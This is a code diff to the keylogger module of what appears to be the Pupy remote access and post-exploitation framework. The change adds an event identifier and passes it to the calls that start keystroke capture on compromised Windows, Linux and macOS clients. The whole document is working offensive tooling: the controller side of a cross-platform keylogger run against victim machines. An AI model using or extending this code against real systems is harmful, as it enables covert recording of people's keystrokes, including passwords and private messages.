@@ -2,7 +2,12 @@
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 
-__class_name__="KeyloggerModule"
+KEYLOGGER_EVENT = 0x11000001
+
+__class_name__ = 'KeyloggerModule'
+__events__ = {
+    KEYLOGGER_EVENT: 'keylogger'
+}
 
 @config(cat="gather", compat=["linux", "darwin", "windows"])
 class KeyloggerModule(PupyModule):
@@ -30,7 +35,7 @@ class KeyloggerModule(PupyModule):
         if args.action=="start":
             if self.client.is_windows():
                 keylogger_start = self.client.remote('pupwinutils.keylogger', 'keylogger_start', False)
-                if not keylogger_start():
+                if not keylogger_start(KEYLOGGER_EVENT):
                     self.error("the keylogger is already started")
                 else:
                     self.success("keylogger started !")
@@ -38,7 +43,7 @@ class KeyloggerModule(PupyModule):
             elif self.client.is_linux():
                 keylogger_start = self.client.remote('keylogger', 'keylogger_start', False)
 
-                r = keylogger_start()
+                r = keylogger_start(KEYLOGGER_EVENT)
                 if r == 'no_x11':
                     self.error("the keylogger does not work without x11 graphical interface")
                 elif not r:
@@ -50,6 +55,7 @@ class KeyloggerModule(PupyModule):
             elif self.client.is_darwin():
                 keylogger_start = self.client.remote('keylogger', 'keylogger_start', False)
 
+                r = keylogger_start(KEYLOGGER_EVENT)
                 if r == 'running':
                     self.error("the keylogger is already started")
                 elif not r:
